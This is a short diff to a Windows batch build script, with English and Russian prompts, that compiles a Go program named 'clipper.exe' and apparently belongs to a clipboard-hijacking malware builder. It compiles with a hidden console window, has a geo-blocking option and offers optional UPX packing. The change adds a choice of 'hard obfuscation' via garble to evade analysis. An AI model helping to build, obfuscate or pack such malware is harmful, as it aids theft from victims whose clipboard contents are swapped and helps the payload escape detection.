@@ -97,9 +97,16 @@ if defined GEO_BLOCK (
     )
 )
 
-garble -literals -seed=random build -trimpath -ldflags="-H windowsgui !LDFLAGS!" -o clipper.exe
+set /p "OBF=Use hard obfuscation / Использовать сильную обфускацию? (y/n): "
+
+if /i "%OBF%"=="y" (
+    garble -literals -seed=random build -trimpath -ldflags="-H windowsgui !LDFLAGS!" -o clipper.exe
+) else (
+    garble build -trimpath -ldflags="-H windowsgui !LDFLAGS!" -o clipper.exe
+)
+
 if errorlevel 1 (
-    echo Build failed
+    echo Build failed / Ошибка при сборке
     pause
     exit /b 1
 )
@@ -116,7 +123,7 @@ echo.
 echo Build successful! / Билд создан: .\clipper.exe
 
 echo.
-set /p "USE_UPX=Use UPX? (y/n): "
+set /p "USE_UPX=Use UPX / Использовать UPX для сжатия? (y/n): "
 
 if /i "!USE_UPX!"=="y" (
     echo.
